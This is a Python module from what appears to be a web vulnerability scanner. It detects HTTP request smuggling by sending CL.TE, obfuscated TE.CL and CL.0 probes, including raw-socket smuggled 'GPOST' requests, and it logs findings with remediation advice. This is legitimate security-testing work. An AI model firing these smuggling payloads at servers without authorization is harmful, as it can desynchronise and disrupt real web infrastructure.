"""
modules/smuggling.py
HTTP Request Smuggling detection module.

Covers:
  - CL.TE probe via httpx
  - TE.CL probe via raw TCP socket (httpx rejects obfuscated TE headers)
  - CL.0 variant

Runs once per server. Errors are silently skipped — never blocks the scan.

Entry point: async def run(scanner) -> None

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations

import asyncio
import time
import urllib.parse
from typing import TYPE_CHECKING

from core.models import Vulnerability, calculate_severity

if TYPE_CHECKING:
    from core.scanner import BaseScanner


async def run(scanner: "BaseScanner", url: str) -> None:
    """Test URL for HTTP request smuggling. Called per-URL by scan_url()."""
    await _test_smuggling(scanner, url)


async def _test_smuggling(scanner: "BaseScanner", url: str) -> bool:
    found = False
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"

    # ── CL.TE probe via httpx ─────────────────────────────────────────────────
    try:
        cl_te_body = b"3\r\nGPO\r\n0\r\n\r\n"
        t0 = time.time()
        res = await scanner.make_request(
            "POST", url, content=cl_te_body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "6",
                "Transfer-Encoding": "chunked",
            },
        )
        elapsed = time.time() - t0
        if res is not None:
            indicators = []
            if res.status_code in (400, 505) and "transfer" in res.text.lower():
                indicators.append(f"HTTP {res.status_code} with TE conflict mention")
            if "GPOST" in res.text:
                indicators.append("Smuggled GPOST verb appeared in response")
            if elapsed > 8:
                indicators.append(f"Timeout signature ({elapsed:.1f}s — CL.TE desync)")
            if indicators:
                sev, cvss = calculate_severity("HTTP Request Smuggling")
                scanner.log_vuln(Vulnerability(
                    type="HTTP Request Smuggling",
                    url=url,
                    parameter="HTTP headers",
                    payload="CL.TE: Content-Length:6 + Transfer-Encoding:chunked",
                    evidence=f"Indicators: {'; '.join(indicators)}",
                    confidence="Medium",
                    severity=sev,
                    cvss_score=cvss,
                    method="POST",
                    detection_method="HTTP Smuggling CL.TE probe — response differential",
                    remediation=(
                        "Normalize HTTP/1.1 request handling at the front-end. "
                        "Reject requests with conflicting Content-Length and Transfer-Encoding headers. "
                        "Use HTTP/2 end-to-end where possible."
                    ),
                    references=["CWE-444", "portswigger.net/web-security/request-smuggling"],
                    confidence_pct=55,
                ))
                found = True
    except Exception:
        pass

    # ── TE.CL probes via raw TCP ──────────────────────────────────────────────
    def _raw_tcp_probe(h: str, p: int, raw_req: str, timeout: float = 6.0) -> str:
        import socket as _sock
        try:
            s = _sock.create_connection((h, p), timeout=timeout)
            s.sendall(raw_req.encode("latin-1", errors="replace"))
            s.settimeout(timeout)
            buf = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    if len(buf) > 8192:
                        break
            except Exception:
                pass
            s.close()
            return buf.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    loop = asyncio.get_event_loop()
    te_cl_probes = [
        ("TE.CL xchunked",
         f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Transfer-Encoding: xchunked\r\nContent-Length: 4\r\n\r\n"
         f"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"),
        ("TE.CL space-chunked",
         f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Transfer-Encoding:  chunked\r\nContent-Length: 4\r\n\r\n"
         f"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"),
        ("CL.0 probe",
         f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Content-Length: 0\r\n\r\n"
         f"GPOST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\n\r\nx=1\r\n"),
    ]

    for variant_name, raw_req in te_cl_probes:
        if found:
            break
        try:
            t0 = time.time()
            raw_resp = await loop.run_in_executor(None, _raw_tcp_probe, host, port, raw_req)
            elapsed = time.time() - t0
            indicators = []
            if "GPOST" in raw_resp:
                indicators.append("Smuggled GPOST appeared in raw response")
            if "400" in raw_resp[:50] and "transfer" in raw_resp.lower():
                indicators.append("HTTP 400 TE conflict in raw response")
            if elapsed > 7:
                indicators.append(f"Socket timeout ({elapsed:.1f}s)")
            if indicators:
                sev, cvss = calculate_severity("HTTP Request Smuggling")
                scanner.log_vuln(Vulnerability(
                    type="HTTP Request Smuggling",
                    url=url,
                    parameter="HTTP headers",
                    payload=variant_name,
                    evidence=f"Indicators: {'; '.join(indicators)}",
                    confidence="Medium",
                    severity=sev,
                    cvss_score=cvss,
                    method="POST",
                    detection_method=f"Raw socket HTTP Smuggling — {variant_name}",
                    remediation=(
                        "Normalize HTTP/1.1; reject ambiguous Transfer-Encoding values. "
                        "Use HTTP/2 end-to-end."
                    ),
                    references=["CWE-444", "portswigger.net/web-security/request-smuggling"],
                    confidence_pct=55,
                ))
                found = True
        except Exception:
            pass

    return found
